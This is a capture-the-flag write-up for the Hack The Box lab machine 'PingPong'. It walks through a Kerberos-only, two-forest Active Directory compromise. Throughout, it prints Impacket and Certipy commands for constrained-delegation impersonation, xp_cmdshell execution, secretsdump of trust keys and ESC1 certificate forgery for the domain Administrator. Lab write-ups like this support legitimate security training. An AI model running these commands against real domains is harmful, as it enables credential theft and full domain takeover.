---
title: "PingPong"
difficulty: Insane
os: Windows
points: 50
rating: 4.8
date: 2026-04-25
avatar: assets/htb/pingpong.png
tags: [active-directory, cross-forest-trust, kerberos-only, mssql-delegation, adcs, aes256, no-ntlm]
htb_url: https://app.hackthebox.com/machines/PingPong
---
## Summary

PingPong is an Insane Windows machine built as an assume-breach, two-forest Active Directory engagement. The external entry point is `PING.HTB` (DC1: `dc1.ping.htb`), which has a bidirectional trust with the internal-only `PONG.HTB` (DC2: `dc2.pong.htb`, reachable only through DC1). Both domains have NTLM disabled, forcing Kerberos-only authentication, and `PONG.HTB` additionally disables RC4 so AES256 keys are mandatory. Significant host clock skew from real UTC means every Kerberos operation needs a `faketime` / `ntpdate` workaround. Starting from a low-privilege foothold in `ping.htb`, I leverage Kerberos and MSSQL constrained delegation to compromise `dc2.pong.htb`, extract cross-realm credential material, and return to `ping.htb` to abuse AD CS, obtaining a certificate that maps to `Administrator@ping.htb`.

## Enumeration

Because the whole chain runs on Kerberos, the first thing I do is sync my clock to the domain controller. The skew is large enough that tickets are rejected outright without it, so I either set time globally or wrap individual commands in `faketime`:

```bash
sudo ntpdate -u dc1.ping.htb
# or per-command:
faketime "$(rdate -p dc1.ping.htb)" impacket-getTGT ...
```

With time handled, I enumerate the forest trust. RPC dumping DC1 and running BloodHound against `ping.htb` confirms the bidirectional trust to `pong.htb`, and I resolve the internal DC2 host through DC1's DNS:

```bash
impacket-rpcdump -no-pass @dc1.ping.htb
bloodhound-python -u <user> -p <pw> -d ping.htb -dc dc1.ping.htb -c All
# Confirm trust: ping.htb <-> pong.htb (bidirectional)
nslookup dc2.pong.htb dc1.ping.htb
```

Enumerating certificate templates on `ping.htb` with Certipy reveals a vulnerable ESC1/ESC8 template that becomes the privilege escalation path later:

```bash
certipy find -u <user>@ping.htb -hashes :<NT> -dc-ip dc1.ping.htb -vulnerable
# Identify ESC1 / ESC8 template
```

## Foothold

A service account in `ping.htb` has constrained delegation to an MSSQL SPN on `dc2.pong.htb`. Since NTLM is disabled, every Impacket call must use `-k` and AES256 key material. I request a TGT for the service account, then chain S4U2Self + S4U2Proxy across the trust to impersonate `Administrator`:

```bash
impacket-getTGT ping.htb/svc_sql:'<pw>' -aesKey <aes256>
# S4U2Self + S4U2Proxy across trust:
impacket-getST -spn 'MSSQLSvc/dc2.pong.htb:1433' \
  -impersonate Administrator -dc-ip dc1.ping.htb \
  ping.htb/svc_sql -k -no-pass -aesKey <aes256>
```

The cross-realm referral chain produces a service ticket for `Administrator@PONG.HTB` via the trust. I use it to connect to MSSQL on DC2 and enable `xp_cmdshell` for command execution:

```bash
impacket-mssqlclient -k dc2.pong.htb -no-pass
# Inside MSSQL:
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';  -- nt authority\system on DC2 if delegation chains correctly
```

When the delegation chains correctly this lands as `nt authority\system` on DC2.

## Privilege Escalation

From SYSTEM on `dc2.pong.htb`, I dump secrets to pull the inter-realm trust keys between `PONG.HTB` and `PING.HTB`. These keys let me forge cross-realm referral TGTs back into `ping.htb`:

```bash
impacket-secretsdump -k -no-pass dc2.pong.htb
# inter-realm trust keys: PONG.HTB <-> PING.HTB
```

Back in `ping.htb`, I abuse the vulnerable AD CS template identified during enumeration. The ESC1 path lets me request a certificate while specifying a `userPrincipalName` of `Administrator@ping.htb`:

```bash
certipy req -u svc_sql@ping.htb -hashes :<NT> \
  -ca PING-CA -template VulnTemplate \
  -upn Administrator@ping.htb -dc-ip dc1.ping.htb
```

PKINIT authentication with the forged certificate yields the NT hash for `Administrator@PING.HTB`, which I can then use with PsExec or WMIExec to take full control of the forest:

```bash
certipy auth -pfx administrator.pfx -dc-ip dc1.ping.htb
# NT hash recovered, PSExec / WMIExec as Administrator
```
